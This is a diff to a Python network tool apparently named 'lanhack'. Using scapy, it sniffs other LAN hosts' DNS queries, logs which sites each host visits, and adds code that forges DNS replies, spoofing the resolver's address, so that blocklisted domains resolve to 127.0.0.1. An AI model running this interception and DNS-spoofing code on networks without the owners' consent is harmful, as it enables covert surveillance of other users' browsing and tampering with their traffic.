@@ -10,7 +10,9 @@ def sniff_sites():
     try:
         scapy.conf.iface = config.iface
         _test = scapy.sniff(count=0, timeout=1, quiet=True)
+        config.log(f"Sniffer: initialized on {config.iface}")
     except Exception as e:
+        config.log(f"Sniffer: init error - {e}")
         print(f"[lanhack] Sniff init error: {e}", flush=True)
         config.sniff_error = str(e)
         return
@@ -32,6 +34,21 @@ def sniff_sites():
             s = pkt[scapy.IP].src; d = pkt[scapy.IP].dst
             if s == config.my_ip or s == config.gateway_ip: return
             if q not in seen[s]: seen[s].add(q); config.captured_sites[s].append((ts,q,"dns",s,d)); config.domain_hits[q] = config.domain_hits.get(q, 0) + 1
+            if config.global_dns_block:
+                from lanhack.dns import _match_blocked
+                if _match_blocked(q, config.dns_blocklist) or _match_blocked(q, list(config.custom_blocks.keys())):
+                    config.log(f"SNIFFER spoofing DNS for {q} from {s}")
+                    ip_hdr = scapy.IP(src=d, dst=s)
+                    udp_hdr = scapy.UDP(sport=53, dport=pkt[scapy.UDP].sport)
+                    dns_resp = scapy.DNS(
+                        id=pkt[scapy.DNS].id,
+                        qr=1, aa=1, ra=1,
+                        qd=pkt[scapy.DNS].qd,
+                        an=scapy.DNSRR(rrname=q, ttl=60, rdata="127.0.0.1", type="A")
+                    )
+                    scapy.send(ip_hdr/udp_hdr/dns_resp, verbose=False)
+                    config.dns_spoof_count += 1
+                    config.log(f"SNIFFER sent 127.0.0.1 for {q}")
         elif pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
             try:
                 s=pkt[scapy.IP].src; d=pkt[scapy.IP].dst
